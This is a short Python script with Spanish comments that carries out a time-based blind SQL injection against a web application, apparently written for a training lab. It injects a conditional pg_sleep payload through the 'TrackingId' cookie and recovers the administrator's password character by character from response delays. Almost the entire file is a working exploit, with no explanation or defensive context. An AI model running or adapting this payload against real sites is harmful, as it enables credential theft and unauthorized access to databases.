#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig,frame):
	print("\n\n[!]Saliendo...\n ")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#URL objetivo
main_url = "https://example.com"
characters = string.ascii_lowercase + string.digits

def makeRequest():

	password=""

	p1 = log.progress("Fuerza Bruta")
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Password")

	for position in range(1, 21):
		for character in characters:
#ejemplo de cookies de sesion
			cookies = {
				'TrackingId': "hQ6K5sFAYh5rpx40'||(select case when substring(password,%d,1)='%s' then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character),
				'session': 'CJBs9XLFMqAT5CEpb8geYwxNvySoPCxg'
			}

			p1.status(cookies['TrackingId'])

			time_start = time.time()

			r = requests.get(main_url, cookies=cookies)

			time_end = time.time()

			if time_end - time_start > 3:
				password += character
				p2.status(password)
				break


if __name__ == '__main__':

	makeRequest()
